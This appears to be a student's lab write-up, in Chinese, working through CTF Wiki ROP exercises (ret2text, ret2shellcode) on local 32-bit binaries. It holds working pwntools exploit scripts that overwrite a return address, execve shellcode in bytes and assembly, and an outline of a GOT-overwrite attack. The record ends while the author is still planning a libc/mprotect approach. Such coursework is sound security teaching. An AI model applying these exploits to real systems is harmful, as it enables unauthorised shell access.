# SimpleROP
国科大网络攻防基础第二次作业（2023）

## 00 概述

这次实验的主题是栈溢出+ROP。ROP的主旨就是在栈溢出的基础上利用程序中已经存在的代码片段来改变某些寄存器或者变量的值，从而实现控制程序的执行流程。一般前提为：

* 程序中存在栈溢出漏洞，可以控制返回地址
* 可以找到满足条件的程序片段以及其地址

### 分析对象

来自[简介 - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/)：

* ret2text
* ret2shellcode
* ret2syscall
* ret2libc 1/2/3

### 实验环境

* VMware 17
* Ubuntu 22.04
* IDA 8.2 (Free)
* PwnTools 4.2
* GDB 12.1

### 需要的知识

#### GOT和PLT

* GOT：全局偏移量表，位于程序的数据段，每个条目8字节，用来存储外部函数（动态链接过来的那些函数）在内存里面的地址，可以在程序运行中被修改，这是因为默认情况下程序只有在需要调用时才导入函数，而不是在一开始就把所有需要用到的函数全部放进表里面。
* PLT：过程链接表：位于程序的代码段，每个条目16字节，前两条是特殊条目，分别用于跳转到动态链接器和记录系统启动函数，其余的条目负责调用一个具体的函数（存储外部函数的入口点，也就是这个函数在GOT表的位置）
* 攻击流程：
    * 确定printf函数在GOT表中的位置：程序在正常执行调用printf函数时通过PLT表跳转到GOT表的指定条目，此时可以通过对应的汇编指令看到这个位置（当然这样一来printf函数在内存中的实际地址也能知道）
    * 确定system函数在内存中的位置：开启堆栈随机化（ASLR）之后动态链接库在内存的位置是随机的，但是一个函数在其所在的链接库内部的相对地址是不变的，如果printf函数和system函数位于同一个动态链接库，那就可以通过printf在内存中的地址+两个函数在动态链接库内的偏移得到system函数在内存中的实际位置
    * 把system函数在内存中的位置值写入printf函数在GOT表中的位置
    * 程序调用printf函数时，通过PLT表跳转到GOT表的对应条目，但是那里已经被覆写，调用的函数实际上是system而不是printf

#### RELRO

让重定位表只读，避免GOT被恶意修改。RERLO有两种形式：

* 部分RELRO：.init_array、.fini_array、.jcr、.dynamic这些表一次性加载，然后变成只读；.got只读；.got.plt依然可写
* 前部RELRO：全都不准写！这样会导致所有符号在程序开始的时候导入，性能和时间开销大

#### Stack Canary

函数执行之前在栈的EBP附近插入一个值，如果被溢出攻击，那这个值就有可能被覆盖

#### NX/DEP

数据段不可执行，数据段可以执行，那么就可以将自己的代码随便放在数据段的某个变量里，然后再用溢出使得函数返回到那个数据段的起始地址。开启NX之后，如果程序发现自己返回到了数据段就会终止运行。因此衍生出了ROP攻击，即利用代码段自带的片段拼凑出攻击逻辑。

#### PIE

地址无关的可执行文件。

正常情况下，内存是这样子的：

* 内核虚拟地址空间（所有进程共享，但是用户空间代码不可见）
* 栈：函数
* 动态映射段（动态库在这里）
* 堆：动态申请的变量
* BSS段：未初始化的变量
* 数据段：静态/全局变量
* 代码段：汇编代码，还有一些字面值变量

开启PIE之后，这些段全部打散，通过GOT来登记其实际位置。

## 01 ret2text

需要的代码都在程序之中，将四散的代码“组装起来”就可以获取Shell。

使用PwnTool附带的checksec工会据查看二进制文件基本信息：

![image-20230413210628073](./README.assets/image-20230413210628073.png)

可以看到：

* 架构：32位小端程序（须在系统中安装32位兼容库）
* RELRO：部分开启
* 金丝雀：没有开启
* 数据段不可执行：开启
* 地址无关：没有开启

现在用IDA反编译二进制文件看一下可以利用的代码片段：

![image-20230413221355861](./README.assets/image-20230413221355861.png)

首先是主函数中一个显眼的gets()函数，说明可以通过变量v4来实现栈溢出。

![image-20230413221526012](./README.assets/image-20230413221526012.png)

然后是secure()函数里面有一个可以直接利用的代码段

![image-20230413222632206](./README.assets/image-20230413222632206.png)

其地址为：0x0804863A

因此我们现在的任务就是通过gets()将main()函数的返回地址指向0x0804863A。最简单粗暴的方式就是往里面输入超长的数据（从主函数的反编译代码里可以看出来其流程就是接受一个输入数据放进变量v4），导致数据溢出覆盖返回地址，让程序报错，通过报错信息来确定返回地址的位置。在IDA反编译代码中已经标注了了变量v4的位置是【ESP+1】【EBP-64】，但是我这个免费版的IDA只有64位，不知道分析32位二进制程序能不能行得通，所以后面尝试用更简单粗暴的方式确认一下：通过get()向变量v4填入超多垃圾数据，在GDB调试中观察报错信息：

![image-20230414134519936](./README.assets/image-20230414134519936.png)

使用`cyclic 200`生成了一个长为200的无序字符串，输入到程序当中去。可以看到EBP、ESP、EIP全都被覆盖了，其中EIP被覆盖就是因为main()的函数栈帧中返回地址被变成了“daab”，也就是0x61626264，main()函数返回之后将返回地址放到EIP寄存器，程序跳转到这个位置发现有问题，所以输出“Invalid address 0x61626264”。因此，子串“ddab”相较于之前输入的200字节长无序字符串的位置就是变量v4到main()函数栈帧返回地址的偏移量。cyclic小工具很贴心的有这个功能，通过`cyclic -l daab`就可以得出这个距离了：112，即从变量v4的屁股到返回地址的屁股之间有112个字节，我们向变量v4填入112个垃圾字节，再填入代表system()函数代码位置的0x804863A这四个字节，就可以让main()返回到system()函数那里了。

开始编写脚本：

```python
from pwn import *


# 创建进程对象
proc = process("./ret2text")

# 目标返回地址
target_addr = 0x804863A

# 字节形式的填充以及32位形式目标地址
proc.sendline(b"#" * 112 + p32(target_addr))

# 交互式界面
proc.interactive()
```

输出结果：

![image-20230414141054749](./README.assets/image-20230414141054749.png)

成功启动了Shell！我尝试将ret2text文件设置为setuid然后再进行相同的攻击，但是并没有得到root权限的shell，等有时间再研究一下。

## 02 ret2shellcode

![image-20230414143108072](./README.assets/image-20230414143108072.png)

啥都没开，对味了。我还尝试在Ubuntu 22.04下随便用GCC编译了一个C程序，看一下默认的安全策略，结果全绿，顿时感觉自己现在就是在路边玩泥巴...

反编译的main()函数代码如下：

![image-20230414143036380](./README.assets/image-20230414143036380.png)

流程和上一个实验相似，但是没有现成的system("/bin/sh")可以用了，需要人工构造。而这个人工构造的shellcode需要放在一个能持续存在的地方（不能放在临时变量里面，因为mian()函数返回之后栈帧里的数据就弹出去了），因此候选目标是未释放的堆/BSS段/DATA段。“恰好”main()函数里面变量v4的值会被复制到缓冲区buf2里面，通过IDA可以看到buf2位于BSS段：

![image-20230414172221895](./README.assets/image-20230414172221895.png)

因为`strncpy(buf2, v4, 100)`，我们输入的数据的前100个字节就会被直接放到BSS段的0x0804A080这个位置，足够放下一段shellcode。那么需要输入到变量v4的数据就是“shellcode+填充+0x0804A080”。

下一步就是确定“shellcode+填充”的总长度，和之前一样，使用cyclic：

![image-20230414143752634](./README.assets/image-20230414143752634.png)

在EIP寄存器的值还是“daab”，也就是说变量v4到main()函数栈帧返回地址的距离和上一个实验一样，还是112字节。

下面来构造脚本：

```python
from pwn import *


pwn_obj = process("./ret2shellcode")
shellcode = asm(shellcraft.sh()).ljust(112, b"\x00") # 总长度112，左对齐
target_addr = 0x0804A080
pwn_obj.sendline(shellcode + p32(target_addr))
pwn_obj.interactive()
```

执行结果：

![image-20230414173439543](./README.assets/image-20230414173439543.png)

图中的红色dollar符号是pwntools自带的，并不是成功获取到了shell，出大问题了，开始检查...

首先是shellcode本身：

```
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80####################################################################'
```

```
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push b'/bin///sh\x00' */
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
/* call execve() */
push SYS_execve /* 0xb */
pop eax
int 0x80
```

是使用execve调用shell的很正常的shellcode。

然后检查一下buf2那里是不是不可执行，使用`breakpoint main`在main函数那里打断点，`run`运行到断点之后使用`vmmap`查看内存情况：

![image-20230414174534940](./README.assets/image-20230414174534940.png)

缓冲区buf2位于0x0804A080，在区间0x804a000~0x804b000内，这个区间的内存的信息显示在第三行，可以读写，但是不能执行。原来是自从Linux内核5.x之后，内存的BSS段默认没有可执行权限。

想要解决这个问题，需要使用`mprotect()`函数来改写BSS段的权限：

```c
#include <unistd.h>
#include <sys/mman.h>

int mprotect(const void* start, size_t len, int prot)
```

参数含义如下：

* start：目标内存页的起始地址
* len：目标内存的长度，需要是内存页大小的整数倍
* prot：保护属性，有四种：可读、可写、可执行、不可访问

因为有三个参数，所以在构造负载的时候需要用到已经存在于程序代码中的“pop pop pop ret”序列：

![image-20230414183114277](./README.assets/image-20230414183114277.png)

可以看到在0x0804862d这里存在合适的代码片段。

然后就是找到mprotect的入口了：

```python
elf = ELF("./ret2shellcode")
for k, v in elf.symbols.items():
    print(f"{k}: {v}")
```

```
stdout: 134520928
_IO_stdin_used: 134514268
stdin: 134520896
: 134520896
__JCR_LIST__: 134520592
deregister_tm_clones: 134513776
register_tm_clones: 134513824
__do_global_dtors_aux: 134513888
completed.6591: 134520932
__do_global_dtors_aux_fini_array_entry: 134520588
frame_dummy: 134513920
__frame_dummy_init_array_entry: 134520584
__FRAME_END__: 134514532
__JCR_END__: 134520592
__init_array_end: 134520588
_DYNAMIC: 134520596
__init_array_start: 134520584
_GLOBAL_OFFSET_TABLE_: 134520832
__libc_csu_fini: 134514240
__x86.get_pc_thunk.bx: 134513760
data_start: 134520872
_edata: 134520880
_fini: 134514244
buf2: 134520960
__data_start: 134520872
__dso_handle: 134520876
__libc_csu_init: 134514128
stdin@@GLIBC_2.0: 134520896
_end: 134521060
_start: 134513712
_fp_hw: 134514264
stdout@@GLIBC_2.0: 134520928
__bss_start: 134520880
main: 134513965
__TMC_END__: 134520880
_init: 134513540
printf: 134513600
plt.printf: 134513600
gets: 134513616
plt.gets: 134513616
puts: 134513632
plt.puts: 134513632
__gmon_start__: 134513648
plt.__gmon_start__: 134513648
__libc_start_main: 134513664
plt.__libc_start_main: 134513664
setvbuf: 134513680
plt.setvbuf: 134513680
strncpy: 134513696
plt.strncpy: 134513696
got.__gmon_start__: 134520856
got.stdin: 134520896
got.stdout: 134520928
got.printf: 134520844
got.gets: 134520848
got.puts: 134520852
got.__libc_start_main: 134520860
got.setvbuf: 134520864
got.strncpy: 134520868
```

然后发现程序中不存在mprotect...寄。但是程序动态链接了`libc.so.6`且存在puts()函数，应该可以通过定位libc来达成目标。
